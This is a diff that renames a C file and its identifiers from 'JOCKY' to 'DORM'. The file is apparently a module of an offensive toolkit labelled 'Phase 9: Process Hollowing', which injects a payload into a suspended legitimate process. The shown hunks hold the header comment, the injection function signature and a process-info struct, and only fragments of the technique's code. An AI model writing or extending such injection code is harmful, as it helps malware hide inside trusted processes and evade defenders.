@@ -1,5 +1,5 @@
 /*
- * JOCKY — Phase 9: Process Hollowing
+ * DORM — Phase 9: Process Hollowing
  * =====================================
  * Spawns a legitimate host process suspended, unmaps its image,
  * writes a payload PE into the vacated space, patches the thread
@@ -125,7 +125,7 @@ apply_relocations(BYTE *image_base, ULONGLONG preferred,
 
 /* ── Public API ──────────────────────────────────────────────────────────── */
 
-BOOL jocky_hollow_inject(
+BOOL dorm_hollow_inject(
     LPCWSTR target_path,
     LPVOID  payload,
     SIZE_T  payload_size)
@@ -208,9 +208,9 @@ BOOL jocky_hollow_inject(
         PVOID     Reserved2[2];
         ULONG_PTR UniqueProcessId;
         PVOID     Reserved3;
-    } JOCKY_PROCESS_BASIC_INFO;
+    } DORM_PROCESS_BASIC_INFO;
 
-    JOCKY_PROCESS_BASIC_INFO pbi;
+    DORM_PROCESS_BASIC_INFO pbi;
     memset(&pbi, 0, sizeof(pbi));
     NTSTATUS qs = NtQIP(pi.hProcess, 0, &pbi, sizeof(pbi), NULL);
     if (qs != STATUS_SUCCESS) {
